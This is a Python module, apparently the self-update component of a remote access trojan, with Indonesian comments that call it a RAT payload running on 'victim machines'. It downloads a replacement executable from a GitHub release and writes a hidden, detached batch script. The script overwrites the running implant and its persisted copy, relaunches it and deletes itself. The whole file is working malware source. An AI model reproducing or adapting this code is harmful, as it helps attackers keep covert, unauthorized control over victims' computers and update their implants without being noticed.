"""core/update.py — ganti build yang sedang jalan, tanpa admin.

Kenapa harus lewat skrip dan bukan `shutil.copy` biasa:

Windows mengunci image exe selama prosesnya hidup. File-nya hanya bisa
ditimpa SETELAH proses yang memegang handle benar-benar keluar. Jadi
urutannya tidak bisa langsung:

    unduh -> timpa -> jalan

melainkan:

    unduh -> verifikasi -> tulis .cmd swap -> proses keluar
           -> .cmd menunggu lock lepas -> timpa -> jalankan -> hapus diri

Yang diverifikasi sebelum ada yang ditimpa:

  1. ukuran masuk akal (tidak nol, tidak di atas 96 MB)
  2. dua byte pertama "MZ" — tanpa ini build rusak akan menimpa RAT yang
     masih hidup dan mesin korban kehilangan aksesnya sama sekali
  3. sha256 kalau dikirim di perintah, cocok atau batal

Tanpa ketiganya, update adalah cara tercepat mengubah satu mesin menjadi
bata. Ini titik paling berbahaya di seluruh payload, jadi pengecekannya
ketat dan kegagalannya dilaporkan apa adanya.
"""

import hashlib
import os
import subprocess
import tempfile

import requests

from . import persist

MAX_BYTES = 96 * 1024 * 1024
CREATE_NO_WINDOW = 0x08000000
API = "https://api.github.com"


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(262144), b""):
            h.update(chunk)
    return h.hexdigest()


def is_pe(path):
    try:
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except OSError:
        return False


def _gh(path, token=""):
    """GET ke api.github.com. Token opsional — repo publik jalan tanpa token."""
    headers = {
        "Accept": "application/vnd.github+json",
        "User-Agent": "curl/8.5.0",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if token:
        headers["Authorization"] = "Bearer " + token
    res = requests.get(API + path, headers=headers, timeout=25)
    if res.status_code != 200:
        snippet = (res.text or "").strip().replace("\n", " ")[:120]
        raise RuntimeError("github %d: %s" % (res.status_code, snippet or "tanpa body"))
    return res.json()


def _pick(assets, want):
    """Urutan pilih: nama yang diminta, lalu .exe, lalu yang pertama.

    Aset rilis RAT biasanya cuma satu exe, tapi repo orang sering menaruh
    paket `.zip` build di sebelahnya. Yang diambil harus file yang bisa
    langsung dieksekusi — zip tidak bisa ditimpa jadi exe.
    """
    if want:
        low = want.lower()
        for a in assets:
            if low in (a.get("name") or "").lower():
                return a
    for a in assets:
        if (a.get("name") or "").lower().endswith(".exe"):
            return a
    return assets[0] if assets else None


def resolve(repo, want="", token=""):
    """Cari URL unduhan build terbaru dari sebuah repo GitHub.

    `repo` boleh `owner/name`, atau URL lengkap `https://github.com/owner/name`.
    Return (url, nama, ukuran, tag). Raise RuntimeError dengan alasan asli
    kalau repo tidak ada, privat, atau rilisnya kosong.
    """
    repo = repo.strip().rstrip("/")
    if repo.startswith("http"):
        repo = repo.split("github.com/", 1)[-1]
    parts = [p for p in repo.split("/") if p]
    if len(parts) < 2:
        raise RuntimeError("format: owner/repo")
    repo = parts[0] + "/" + parts[1]

    try:
        rel = _gh("/repos/%s/releases/latest" % repo, token)
    except RuntimeError as exc:
        # Repo yang cuma punya tag tanpa "latest release" balas 404 di sini
        # padahal rilisnya ada. Ambil daftar dan pakai yang pertama.
        if "404" not in str(exc):
            raise
        arr = _gh("/repos/%s/releases?per_page=5" % repo, token)
        if not arr:
            raise RuntimeError("repo tanpa rilis")
        rel = arr[0]

    assets = rel.get("assets") or []
    if not assets:
        raise RuntimeError("rilis %s tidak punya aset" % rel.get("tag_name", "?"))
    asset = _pick(assets, want)
    if not asset:
        raise RuntimeError("tidak ada aset yang cocok")

    url = asset.get("browser_download_url") or ""
    if not url:
        raise RuntimeError("aset tanpa url")
    return url, asset.get("name") or "build.exe", int(asset.get("size") or 0), rel.get("tag_name", "")


def targets(name):
    """File yang harus ditimpa. Yang pertama selalu exe yang sedang jalan."""
    out = []
    here = persist.self_path()
    if here and os.path.isfile(here):
        out.append(os.path.abspath(here))

    inst = os.path.abspath(persist.target_path(name))
    if os.path.isfile(inst) and all(os.path.abspath(p) != inst for p in out):
        out.append(inst)
    return out


def launch_path(name, files):
    """Yang dijalankan setelah swap: salinan terpasang kalau ada."""
    inst = os.path.abspath(persist.target_path(name))
    if inst in files:
        return inst
    return files[0] if files else ""


def verify(staged, expect=""):
    if not os.path.isfile(staged):
        return False, "file hasil unduhan tidak ada"
    size = os.path.getsize(staged)
    if size < 4096:
        return False, "terlalu kecil (%d B), kemungkinan halaman error" % size
    if size > MAX_BYTES:
        return False, "terlalu besar (%d MB)" % (size // 2 ** 20)
    if not is_pe(staged):
        return False, "bukan PE (header bukan MZ)"
    if expect:
        got = sha256(staged)
        if got != expect.lower():
            return False, "sha256 beda: dapat %s" % got[:16]
    return True, "ok %d B" % size


def script(staged, files, run, tries=45):
    """Isi .cmd. Tanpa blok kurung, tanpa delayed expansion.

    Blok `( ... )` di batch mengganti %var% jadi nilai saat parse, bukan
    saat eksekusi, jadi counter di dalam loop akan bekukan. Label + goto
    menghindari seluruh kelas bug itu.
    """
    lines = [
        "@echo off",
        "setlocal enableextensions",
        'set "SRC=%s"' % staged,
        'set "LOG=%s"' % os.path.join(os.path.dirname(staged), "upd_last.log"),
        'echo [update] %s > "%%LOG%%"' % _stamp(),
    ]
    for index, target in enumerate(files, 1):
        lines += [
            "set /a i%d=0" % index,
            ":try%d" % index,
            'if not exist "%s" goto pass%d' % (target, index),
            'copy /y "%%SRC%%" "%s" >nul 2>&1' % target,
            "if not errorlevel 1 goto pass%d" % index,
            "set /a i%d=%%i%d%%+1" % (index, index),
            "if %%i%d%% geq %d goto fail" % (index, tries),
            "ping -n 2 127.0.0.1 >nul",
            "goto try%d" % index,
            ":pass%d" % index,
        ]
    lines += [
        'echo [update] swap ok >> "%LOG%"',
        'start "" "%s"' % run,
        "goto done",
        ":fail",
        'echo [update] gagal menimpa, lock tidak lepas >> "%LOG%"',
        ":done",
        'if exist "%SRC%" del /f /q "%SRC%" >nul 2>&1',
        'del /f /q "%~f0" >nul 2>&1',
        "",
    ]
    return "\r\n".join(lines)


def _stamp():
    import time
    return time.strftime("%Y-%m-%d %H:%M:%S")


def apply(staged, files, run, tries=45):
    """Tulis skrip swap lalu jalankan terpisah dari proses ini.

    Return path skrip, atau None kalau gagal menulis.
    """
    if not files:
        return None
    path = os.path.join(tempfile.gettempdir(), "upd_%d.cmd" % os.getpid())
    body = script(staged, files, run, tries)
    try:
        with open(path, "w", encoding="utf-8", newline="\r\n") as fh:
            fh.write(body)
    except OSError:
        return None
    try:
        subprocess.Popen('cmd /c "%s"' % path, shell=False,
                         creationflags=CREATE_NO_WINDOW | 0x00000008,
                         close_fds=True)
    except OSError:
        return None
    return path


def report(name):
    """Ringkasan build yang sedang jalan. Dipakai `update` tanpa argumen."""
    here = persist.self_path()
    lines = []
    if not here or not os.path.isfile(here):
        lines.append("exe    : (jalan dari source, tidak bisa di-update)")
    else:
        try:
            lines.append("exe    : %s" % here)
            lines.append("ukuran : %d B" % os.path.getsize(here))
            lines.append("sha256 : %s" % sha256(here))
        except OSError as exc:
            lines.append("exe    : %s (tidak terbaca: %s)" % (here, exc))

    inst = persist.target_path(name)
    if os.path.isfile(inst):
        same = ""
        if here and os.path.isfile(here):
            try:
                same = " | sama" if sha256(inst) == sha256(here) else " | BEDA"
            except OSError:
                same = ""
        lines.append("install: %s%s" % (inst, same))
    else:
        lines.append("install: belum terpasang")

    staged = os.path.join(tempfile.gettempdir(), "upd_last.log")
    if os.path.isfile(staged):
        try:
            with open(staged, encoding="utf-8", errors="replace") as fh:
                lines.append("last   : %s" % fh.read().strip().replace("\r\n", " / "))
        except OSError:
            pass
    return "\n".join(lines)
